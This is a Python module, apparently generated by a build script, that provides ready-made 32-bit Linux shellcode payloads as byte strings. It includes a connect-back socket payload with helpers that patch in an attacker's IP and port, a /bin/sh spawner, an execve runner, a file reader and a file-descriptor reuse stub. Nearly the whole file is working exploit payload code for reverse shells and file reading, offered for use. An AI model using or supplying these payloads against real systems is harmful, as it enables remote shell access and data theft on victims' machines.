#!/usr/bin/python

# THIS FILE WAS GENERATED BY RUNNING MAKE
# IF YOU WANT TO MODIFY THIS FILE, YOU SHOULD MODIFY THE SOURCE IN src/ THEN RUN make

# Date Created:
# Wed Oct 23 00:56:43 UTC 2013

# uname -a:
# Linux ubuntu 3.5.0-23-generic #35~precise1-Ubuntu SMP Fri Jan 25 17:15:33 UTC 2013 i686 i686 i386 GNU/Linux

# assembler:
# GNU assembler (GNU Binutils for Ubuntu) 2.22
# Copyright 2011 Free Software Foundation, Inc.
# This program is free software; you may redistribute it under the terms of
# the GNU General Public License version 3 or later.
# This program has absolutely no warranty.
# This assembler was configured for a target of `i686-linux-gnu'.

connect_shellcode = ""
connect_shellcode += "\x68\x7f\x00\x00\x01\x68\x02\x00\x04\xd2\x89\xe6\x31\xc0\x50\xb0"
connect_shellcode += "\x66\x31\xdb\x43\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0"
connect_shellcode += "\xb0\x66\x31\xdb\xb3\x03\x6a\x10\x56\x57\x89\xe1\xcd\x80\x31\xc9"
connect_shellcode += "\x39\xc8\x75\x10\x31\xc0\xb0\x3f\x89\xfb\xcd\x80\x41\x83\xf9\x04"
connect_shellcode += "\x75\xf2\xeb\x07\x31\xdb\x31\xc0\x40\xcd\x80"

execve_shellcode = ""
execve_shellcode += "\xeb\x2c\x5e\x6a\x00\x89\xf0\xeb\x01\x40\x80\x38\x00\x74\x09\x50"
execve_shellcode += "\x80\x38\x00\x74\xf4\x40\xeb\xf8\x31\xc0\x50\x89\xe2\x8d\x4c\x24"
execve_shellcode += "\x04\x8b\x19\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xcf"
execve_shellcode += "\xff\xff\xff\x2d\x61\x00\x2f\x62\x69\x6e\x2f\x75\x6e\x61\x6d\x65"
execve_shellcode += "\x00\x00"

execve_sh_shellcode = ""
execve_sh_shellcode += "\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe6\x31\xc0\x50\x89"
execve_sh_shellcode += "\xe2\x56\x89\xe1\xb0\x0b\x89\xf3\xcd\x80"

exit_shellcode = ""
exit_shellcode += "\x31\xdb\x31\xc0\x40\xcd\x80"

helloworld_shellcode = ""
helloworld_shellcode += "\xeb\x17\x5e\x31\xd2\xb2\x0d\x89\xf1\x31\xdb\x43\x31\xc0\xb0\x04"
helloworld_shellcode += "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xe4\xff\xff\xff\x48\x65"
helloworld_shellcode += "\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0a"

readfile_shellcode = ""
readfile_shellcode += "\xeb\x38\x5e\x31\xc0\xb0\x05\x89\xf3\x31\xc9\x31\xd2\xcd\x80\x89"
readfile_shellcode += "\xc7\x6a\x00\x31\xc0\xb0\x03\x89\xfb\x89\xe1\x31\xd2\x42\xcd\x80"
readfile_shellcode += "\x83\xf8\x00\x7e\x0e\x92\x89\xe1\x31\xdb\x43\x31\xc0\xb0\x04\xcd"
readfile_shellcode += "\x80\xeb\xe0\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xc3\xff\xff\xff\x72"
readfile_shellcode += "\x65\x61\x64\x66\x69\x6c\x65\x2e\x73\x00"

reusefd_shellcode = ""
reusefd_shellcode += "\xbf\x05\x00\x00\x00\x31\xc9\x31\xc0\xb0\x3f\x89\xfb\xcd\x80\x41"
reusefd_shellcode += "\x83\xf9\x04\x75\xf2"


def connect(ip, port):
	import struct
	import socket
	ip = socket.inet_aton(ip)
	port = struct.pack("!H", port)
	family = struct.pack("<H", 2)
	return connect_shellcode.replace("\x68\x7f\x00\x00\x01", "\x68" + ip).replace("\x68\x02\x00\x04\xd2", "\x68" + family + port)


def execve(parameter_list):
	params = ""
	for x in reversed(parameter_list):
		params += x + "\x00"
	params += "\x00"
	return execve_shellcode[:-(len("-a\x00/bin/uname\x00\x00"))] + params

def execve_sh():
	return execve_sh_shellcode


def exit():
	return exit_shellcode


def helloworld():
	return helloworld_shellcode


def readfile(filename):
	params = filename + "\x00"
	return readfile_shellcode[:-(len("readfile.s\x00"))] + params


def reusefd(fd):
	import struct
	params = struct.pack("<I", int(fd))
	return reusefd_shellcode.replace("\x05\x00\x00\x00", params)
